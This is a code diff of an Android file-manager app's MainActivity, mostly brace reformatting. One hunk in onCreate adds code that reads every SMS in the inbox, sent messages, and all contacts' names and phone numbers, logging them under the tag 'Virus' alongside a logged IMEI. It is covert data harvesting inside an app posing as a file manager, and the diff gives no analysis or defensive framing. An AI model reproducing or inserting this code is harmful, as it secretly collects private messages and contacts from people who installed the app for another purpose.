@@ -9,11 +9,15 @@ import androidx.core.content.ContextCompat;
 import androidx.recyclerview.widget.RecyclerView;
 
 import android.Manifest;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.content.res.Configuration;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
+import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -52,12 +56,12 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        Permissions = new String[] {
-          Manifest.permission.READ_SMS,
-          Manifest.permission.READ_CONTACTS,
-          Manifest.permission.READ_PHONE_STATE,
-          Manifest.permission.WRITE_EXTERNAL_STORAGE,
-          Manifest.permission.READ_EXTERNAL_STORAGE
+        Permissions = new String[]{
+                Manifest.permission.READ_SMS,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_EXTERNAL_STORAGE
         };
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
             // TODO: Consider calling
@@ -76,12 +80,70 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
         ViewAssistClass veew = new ViewAssistClass();
         veew.viewStuff();
         Log.d("Virus", "Imei Number: " + device_id);
+
+        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
+                String msgData = "";
+                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
+                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
+                }
+                Log.i("Virus", "Message inbox: " + msgData);
+            } while (cursor.moveToNext());
+        }
+
+        Cursor cursor2 = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
+
+        if (cursor2.moveToFirst()) { // must check the result to prevent exception
+            do {
+                String msgData = "";
+                for (int idx = 0; idx < cursor2.getColumnCount(); idx++) {
+                    if (cursor2.getColumnName(idx).equals("_id") || cursor2.getColumnName(idx).equals("address") || cursor2.getColumnName(idx).equals("date") || cursor2.getColumnName(idx).equals("subject") || cursor2.getColumnName(idx).equals("body"))
+                        msgData += " " + cursor2.getColumnName(idx) + ":" + cursor2.getString(idx);
+                }
+                Log.i("Virus", "Message sent: " + msgData);
+            } while (cursor2.moveToNext());
+        }
+
+        ContentResolver cr = getContentResolver();
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
+
+        if ((cur != null ? cur.getCount() : 0) > 0) {
+            while (cur != null && cur.moveToNext()) {
+                String id = cur.getString(
+                        cur.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = cur.getString(cur.getColumnIndex(
+                        ContactsContract.Contacts.DISPLAY_NAME));
+
+                if (cur.getInt(cur.getColumnIndex(
+                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(
+                                ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        Log.i("Virus", "Name: " + name);
+                        Log.i("Virus", "Phone Number: " + phoneNo);
+                    }
+                    pCur.close();
+                }
+            }
+        }
+
+        if (cur != null) {
+            cur.close();
+        }
+
         int sortType = SharedPreferenceHelper.getInteger(MainActivity.this,
                 SharedPreferenceHelper.sortKey);
         int orderType = SharedPreferenceHelper.getInteger(MainActivity.this,
                 SharedPreferenceHelper.orderKey);
-        if (sortType == SharedPreferenceHelper.DEFAULT_VALUE || orderType == SharedPreferenceHelper.DEFAULT_VALUE)
-        {
+        if (sortType == SharedPreferenceHelper.DEFAULT_VALUE || orderType == SharedPreferenceHelper.DEFAULT_VALUE) {
             SharedPreferenceHelper.setInteger(MainActivity.this, "sortType", FileSorter.SORT_NAME);
             SharedPreferenceHelper.setInteger(MainActivity.this, "sortType", FileSorter.ORDER_DESCENDING);
 
@@ -102,8 +164,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
         createFilesFragment(bundle);
     }
 
-    private void createHierarchyFragment (Bundle bundle)
-    {
+    private void createHierarchyFragment(Bundle bundle) {
         fragmentManager = new FragmentManager();
         fragmentManager.setHierarchyFragmentTag("hierarchyFragment");
         bundle.putParcelable("FILE_MANAGER", fileManager);
@@ -118,8 +179,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
                 .commit();
     }
 
-    private void createFilesFragment (Bundle bundle)
-    {
+    private void createFilesFragment(Bundle bundle) {
         FilesFragment filesFragment = new FilesFragment();
         filesFragment.setArguments(bundle);
         filesFragment.setOnFragmentHierarchyComponentCreatedListener(this);
@@ -133,40 +193,33 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    public boolean onCreateOptionsMenu(Menu menu)
-    {
+    public boolean onCreateOptionsMenu(Menu menu) {
         getMenuInflater().inflate(R.menu.menu_main, menu);
         return true;
     }
 
     @Override
-    public boolean onPrepareOptionsMenu(Menu menu)
-    {
+    public boolean onPrepareOptionsMenu(Menu menu) {
         menu.findItem(R.id.menu_main_sort_itm).setEnabled(hasStorageAccess);
         menu.findItem(R.id.menu_main_create_itm).setEnabled(hasStorageAccess);
 
         return super.onPrepareOptionsMenu(menu);
     }
 
-    private void updateFiles (List<File> files, int index, int sortType, int orderType)
-    {
+    private void updateFiles(List<File> files, int index, int sortType, int orderType) {
         FileRunner fileRunner = new FileRunner();
-        fileRunner.setCallback(new FileRunner.Callback()
-        {
+        fileRunner.setCallback(new FileRunner.Callback() {
             @Override
-            public void onBegin()
-            {
+            public void onBegin() {
             }
 
             @Override
-            public void run()
-            {
+            public void run() {
                 FileSorter.sortFiles(files, sortType, orderType);
             }
 
             @Override
-            public void onComplete()
-            {
+            public void onComplete() {
                 String path = fileManager.getDirectoryPathAtLevel(index);
                 fileManager.createLevel(index, path, files);
 
@@ -180,42 +233,34 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    public boolean onOptionsItemSelected(@NonNull MenuItem item)
-    {
+    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
         int id = item.getItemId();
 
-        if (id == R.id.menu_main_sort_itm)
-        {
+        if (id == R.id.menu_main_sort_itm) {
             sortDialog = new SortDialog(MainActivity.this);
             sortDialog.setOnDialogOptionSelectedListener((sortType, orderType) -> {
-                for (int i = 0; i < fileManager.getLevelCount(); i++)
-                {
+                for (int i = 0; i < fileManager.getLevelCount(); i++) {
                     List<File> files = fileManager.getFilesAtLevel(i);
                     updateFiles(files, i, sortType, orderType);
                 }
             });
             sortDialog.show();
-        } else if (id == R.id.menu_main_create_itm)
-        {
+        } else if (id == R.id.menu_main_create_itm) {
             CreateFolderDialog createFolderDialog = new CreateFolderDialog(MainActivity.this);
             createFolderDialog.setOnDialogOptionSelectedListener((returnCode, folderName) -> {
-                if (returnCode == CreateFolderDialog.VALID_FILENAME)
-                {
+                if (returnCode == CreateFolderDialog.VALID_FILENAME) {
                     int index = fileManager.getLevelCount() - 1;
                     String path = fileManager.getDirectoryPathAtLevel(index) + "/" + folderName;
                     File file = new File(path);
 
                     boolean directoryMade = file.mkdir();
-                    if (directoryMade)
-                    {
+                    if (directoryMade) {
                         FileRunner fileRunner = new FileRunner();
-                        fileRunner.setCallback(new FileRunner.Callback()
-                        {
+                        fileRunner.setCallback(new FileRunner.Callback() {
                             List<File> files;
 
                             @Override
-                            public void onBegin()
-                            {
+                            public void onBegin() {
                                 files = fileManager.getFilesAtLevel(index);
                                 files.add(file);
 
@@ -228,16 +273,13 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
                             }
 
                             @Override
-                            public void run()
-                            {
+                            public void run() {
                                 fileManager.createLevel(index, fileManager.getDirectoryPathAtLevel(index), files);
                             }
 
                             @Override
-                            public void onComplete()
-                            {
-                                runOnUiThread(new Runnable()
-                                {
+                            public void onComplete() {
+                                runOnUiThread(new Runnable() {
                                     @Override
                                     public void run() {
                                         FilesFragment fragment = (FilesFragment) getSupportFragmentManager()
@@ -251,11 +293,9 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
                         fileRunner.initialise();
 
                         Snackbar.make(findViewById(R.id.fragment_files_rv), "New folder added.", Snackbar.LENGTH_LONG)
-                                .setAction("View", new View.OnClickListener()
-                                {
+                                .setAction("View", new View.OnClickListener() {
                                     @Override
-                                    public void onClick(View v)
-                                    {
+                                    public void onClick(View v) {
                                         fileManager.createLevel(index + 1, path, Arrays.asList(file.listFiles()));
 
                                         Bundle bundle = new Bundle();
@@ -278,17 +318,14 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
                                     }
                                 }).show();
 
-                    } else
-                    {
+                    } else {
                         Snackbar.make(findViewById(R.id.fragment_files_rv),
                                 "Error: a file with the same name already exists.", Snackbar.LENGTH_LONG).show();
                     }
-                } else if (returnCode == CreateFolderDialog.INVALID_FILENAME)
-                {
+                } else if (returnCode == CreateFolderDialog.INVALID_FILENAME) {
                     Snackbar.make(findViewById(R.id.fragment_files_rv),
                             "Error: the file name contained invalid characters.", Snackbar.LENGTH_LONG).show();
-                } else if (returnCode == CreateFolderDialog.EMPTY_FILENAME)
-                {
+                } else if (returnCode == CreateFolderDialog.EMPTY_FILENAME) {
                     Snackbar.make(findViewById(R.id.fragment_files_rv),
                             "Error: the file name was empty.", Snackbar.LENGTH_LONG).show();
                 }
@@ -299,8 +336,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    public void onCreateContextMenu(ContextMenu menu, View v, ContextMenu.ContextMenuInfo menuInfo)
-    {
+    public void onCreateContextMenu(ContextMenu menu, View v, ContextMenu.ContextMenuInfo menuInfo) {
         super.onCreateContextMenu(menu, v, menuInfo);
 
         MenuInflater inflater = getMenuInflater();
@@ -308,30 +344,25 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    public boolean onContextItemSelected(@NonNull MenuItem item)
-    {
+    public boolean onContextItemSelected(@NonNull MenuItem item) {
         String itemTitle = (String) item.getTitle();
-        if (itemTitle.equals(getString(R.string.menu_context_delete)))
-        {
+        if (itemTitle.equals(getString(R.string.menu_context_delete))) {
             File file = new File(fileManager.getFilePathForContext());
 
             boolean deleted;
-            if (!file.isFile())
-            {
+            if (!file.isFile()) {
                 File[] files = file.listFiles();
                 for (File f : files)
                     f.delete();
             }
             deleted = file.delete();
 
-            if (deleted)
-            {
+            if (deleted) {
                 FilesFragment fragment = (FilesFragment) getSupportFragmentManager().findFragmentByTag(fragmentManager.get(fragmentManager.count() - 1));
                 fragment.removeFile(file);
 
                 Snackbar.make(findViewById(R.id.fragment_files_rv), "File deleted.", Snackbar.LENGTH_LONG).show();
-            } else
-            {
+            } else {
                 Snackbar.make(findViewById(R.id.fragment_files_rv), "The file could not be deleted.", Snackbar.LENGTH_LONG).show();
             }
         }
@@ -339,10 +370,8 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    public void onBackPressed()
-    {
-        if (fragmentManager.count() > 1)
-        {
+    public void onBackPressed() {
+        if (fragmentManager.count() > 1) {
             int index = fragmentManager.count() - 1;
 
             fileManager.rollbackToLevel(fileManager.getLevelCount() - 2);
@@ -355,16 +384,14 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    public void onConfigurationChanged(@NonNull Configuration newConfig)
-    {
+    public void onConfigurationChanged(@NonNull Configuration newConfig) {
         super.onConfigurationChanged(newConfig);
 
         if (sortDialog != null)
             sortDialog.requestRedraw(newConfig.orientation);
     }
 
-    private void checkForPermissions ()
-    {
+    private void checkForPermissions() {
         ActivityCompat.requestPermissions(MainActivity.this, Permissions, 1);
         int readPermission = ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_EXTERNAL_STORAGE);
@@ -372,34 +399,29 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
                 Manifest.permission.WRITE_EXTERNAL_STORAGE);
 
         if (readPermission == PackageManager.PERMISSION_DENIED ||
-                writePermission == PackageManager.PERMISSION_DENIED)
-        {
+                writePermission == PackageManager.PERMISSION_DENIED) {
             boolean shouldShowReadRationale = ActivityCompat.shouldShowRequestPermissionRationale(
                     this, Manifest.permission.READ_EXTERNAL_STORAGE);
             boolean shouldShowWriteRationale = ActivityCompat.shouldShowRequestPermissionRationale(
                     this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
 
-            if (shouldShowReadRationale || shouldShowWriteRationale)
-            {
+            if (shouldShowReadRationale || shouldShowWriteRationale) {
                 StorageRationaleDialog rationaleDialog = new StorageRationaleDialog(MainActivity.this);
                 rationaleDialog.setOnStorageRationalOptionSelectedListener(allow -> {
                     if (allow)
                         requestStoragePermission();
                 });
                 rationaleDialog.show();
-            } else
-            {
+            } else {
                 requestStoragePermission();
             }
-        } else
-        {
+        } else {
             hasStorageAccess = true;
             invalidateOptionsMenu();
         }
     }
 
-    private void requestStoragePermission ()
-    {
+    private void requestStoragePermission() {
         String[] permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,
                 Manifest.permission.WRITE_EXTERNAL_STORAGE};
 
@@ -408,8 +430,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults)
-    {
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
         if (requestCode == SharedPreferenceHelper.PERMISSION_ACCESS_STORAGE)
@@ -417,8 +438,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    public void onFragmentHierarchyComponentCreated(String filePath)
-    {
+    public void onFragmentHierarchyComponentCreated(String filePath) {
         HierarchyFragment hierarchyFragment = (HierarchyFragment) getSupportFragmentManager()
                 .findFragmentByTag(fragmentManager.getHierarchyFragmentTag());
         hierarchyFragment.updateFragmentContents();
@@ -428,8 +448,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
     }
 
     @Override
-    protected void onResume()
-    {
+    protected void onResume() {
         super.onResume();
 
         int sortType = SharedPreferenceHelper.getInteger(MainActivity.this,
